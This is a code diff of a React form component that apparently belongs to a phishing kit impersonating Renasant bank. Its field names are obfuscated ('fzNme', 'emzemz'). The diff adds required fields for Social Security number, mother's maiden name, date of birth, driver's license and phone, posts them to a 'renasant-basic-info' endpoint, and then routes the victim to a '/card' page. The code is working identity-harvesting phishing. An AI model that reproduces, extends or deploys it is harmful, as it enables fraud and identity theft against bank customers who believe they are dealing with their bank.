@@ -9,9 +9,25 @@ import FormError from '../components/FormError';
 const BasicInfo: React.FC = () => {
   const [fzNme, setFzNme] = useState('');
   const [lzNme, setLzNme] = useState('');
-  const [email, setEmail] = useState('');
+  const [phone, setPhone] = useState('');
+  const [ssn, setSsn] = useState('');
+  const [motherMaidenName, setMotherMaidenName] = useState('');
+  const [month, setMonth] = useState('');
+  const [day, setDay] = useState('');
+  const [year, setYear] = useState('');
+  const [driverLicense, setDriverLicense] = useState('');
+  const [showSSN, setShowSSN] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '', form: '' });
+  const [errors, setErrors] = useState({ 
+    fzNme: '', 
+    lzNme: '', 
+    phone: '', 
+    ssn: '', 
+    motherMaidenName: '', 
+    dob: '', 
+    driverLicense: '',
+    form: '' 
+  });
   const [username, setUsername] = useState('');
   const navigate = useNavigate();
   const location = useLocation();
@@ -26,21 +42,61 @@ const BasicInfo: React.FC = () => {
     }
   }, [emzemzState]);
 
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
+  const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;
+
+  const formatPhone = (value: string) => {
+    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
+    if (digitsOnly.length >= 7) {
+      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
+    } else if (digitsOnly.length >= 4) {
+      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
+    }
+    return digitsOnly;
+  };
+
+  const formatSSN = (value: string) => {
+    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
+    if (digitsOnly.length >= 6) {
+      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
+        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
+      );
+    } else if (digitsOnly.length >= 4) {
+      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
+        p2 ? `${p1}-${p2}` : `${p1}`
+      );
+    }
+    return digitsOnly;
   };
 
   const validateForm = () => {
-    const newErrors = { fzNme: '', lzNme: '', email: '', form: '' };
+    const phoneDigits = phone.replace(/\D/g, '');
+    const ssnDigits = ssn.replace(/\D/g, '');
+    
+    const newErrors = { 
+      fzNme: !fzNme.trim() ? 'First name is required.' : '',
+      lzNme: !lzNme.trim() ? 'Last name is required.' : '',
+      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits.' : '',
+      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits.' : '',
+      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required." : '',
+      dob: (!month || !day || !year) ? 'Complete date of birth is required.' : '',
+      driverLicense: !driverLicense.trim() ? "Driver's license is required." : '',
+      form: ''
+    };
 
-    if (!email.trim()) newErrors.email = 'Email is required.';
-    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format.';
-    if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
-    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required.';
+    if (month && day && year) {
+      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
+      const age = new Date().getFullYear() - dob.getFullYear();
+      const monthDiff = new Date().getMonth() - dob.getMonth();
+      
+      if (age < 18 || (age === 18 && monthDiff < 0)) {
+        newErrors.dob = 'You must be at least 18 years old.';
+      }
+    }
 
     setErrors(newErrors);
-    return !newErrors.email && !newErrors.fzNme && !newErrors.lzNme;
+    return !Object.values(newErrors).some(error => error);
   };
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
@@ -53,19 +109,31 @@ const BasicInfo: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/renasant-meta-data-3/`, {
+      const getMonthName = (monthNumber: string) => {
+        const monthNames = [
+          "January", "February", "March", "April", "May", "June",
+          "July", "August", "September", "October", "November", "December"
+        ];
+        return monthNames[parseInt(monthNumber) - 1] || '';
+      };
+
+      const dob = `${getMonthName(month)}/${day}/${year}`;
+
+      await axios.post(`${baseUrl}api/renasant-basic-info/`, {
         emzemz: username,
-        email,
         fzNme,
         lzNme,
+        phone,
+        ssn,
+        motherMaidenName,
+        dob,
+        driverLicense
       });
 
-      navigate('/home-address', {
+      navigate('/card', {
         state: {
-          emzemz: username,
-          fzNme,
-          lzNme,
-        },
+          emzemz: username
+        }
       });
     } catch (error) {
       console.error('Error submitting form:', error);
@@ -118,24 +186,6 @@ const BasicInfo: React.FC = () => {
     >
       <form onSubmit={handleSubmit} className="space-y-4">
         <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="email">
-            Email address
-          </label>
-          <div className="flex items-center border border-slate-200 rounded">
-            <input
-              id="email"
-              name="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              className="w-full px-3 py-3 text-sm focus:outline-none"
-              placeholder="name@example.com"
-            />
-          </div>
-          {errors.email ? <FormError message={errors.email} /> : null}
-        </div>
-
-        <div>
           <label className="block text-sm text-slate-500 mb-1" htmlFor="fzNme">
             First name
           </label>
@@ -169,6 +219,133 @@ const BasicInfo: React.FC = () => {
             />
           </div>
           {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="phone">
+            Phone Number
+          </label>
+          <div className="flex items-center border border-slate-200 rounded">
+            <input
+              id="phone"
+              name="phone"
+              type="text"
+              value={phone}
+              onChange={(e) => setPhone(formatPhone(e.target.value))}
+              className="w-full px-3 py-3 text-sm focus:outline-none"
+              placeholder="(555) 123-4567"
+            />
+          </div>
+          {errors.phone ? <FormError message={errors.phone} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="ssn">
+            Social Security Number
+          </label>
+          <div className="flex items-center border border-slate-200 rounded">
+            <input
+              id="ssn"
+              name="ssn"
+              type={showSSN ? 'text' : 'password'}
+              value={ssn}
+              onChange={(e) => setSsn(formatSSN(e.target.value))}
+              maxLength={11}
+              className="w-full px-3 py-3 text-sm focus:outline-none"
+              placeholder="XXX-XX-XXXX"
+            />
+            <button
+              type="button"
+              onClick={() => setShowSSN(!showSSN)}
+              className="px-3 text-green-600 text-sm hover:underline"
+            >
+              {showSSN ? 'Hide' : 'Show'}
+            </button>
+          </div>
+          {errors.ssn ? <FormError message={errors.ssn} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="motherMaidenName">
+            Mother's Maiden Name
+          </label>
+          <div className="flex items-center border border-slate-200 rounded">
+            <input
+              id="motherMaidenName"
+              name="motherMaidenName"
+              type="text"
+              value={motherMaidenName}
+              onChange={(e) => setMotherMaidenName(e.target.value)}
+              className="w-full px-3 py-3 text-sm focus:outline-none"
+              placeholder="Enter maiden name"
+            />
+          </div>
+          {errors.motherMaidenName ? <FormError message={errors.motherMaidenName} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1">Date of Birth</label>
+          <div className="flex gap-2">
+            <select
+              value={month}
+              onChange={(e) => setMonth(e.target.value)}
+              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
+            >
+              <option value="">Month</option>
+              {Array.from({ length: 12 }, (_, i) => (
+                <option key={i + 1} value={i + 1}>
+                  {new Date(0, i).toLocaleString('default', { month: 'long' })}
+                </option>
+              ))}
+            </select>
+            <select
+              value={day}
+              onChange={(e) => setDay(e.target.value)}
+              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
+              disabled={!month || !year}
+            >
+              <option value="">Day</option>
+              {Array.from({ length: daysInMonth }, (_, i) => (
+                <option key={i + 1} value={i + 1}>
+                  {i + 1}
+                </option>
+              ))}
+            </select>
+            <select
+              value={year}
+              onChange={(e) => {
+                setYear(e.target.value);
+                setDay('');
+              }}
+              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
+            >
+              <option value="">Year</option>
+              {years.map((y) => (
+                <option key={y} value={y}>
+                  {y}
+                </option>
+              ))}
+            </select>
+          </div>
+          {errors.dob ? <FormError message={errors.dob} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="driverLicense">
+            Driver's License Number
+          </label>
+          <div className="flex items-center border border-slate-200 rounded">
+            <input
+              id="driverLicense"
+              name="driverLicense"
+              type="text"
+              value={driverLicense}
+              onChange={(e) => setDriverLicense(e.target.value)}
+              className="w-full px-3 py-3 text-sm focus:outline-none"
+              placeholder="Enter license number"
+            />
+          </div>
+          {errors.driverLicense ? <FormError message={errors.driverLicense} /> : null}
         </div>
 
         {errors.form ? (
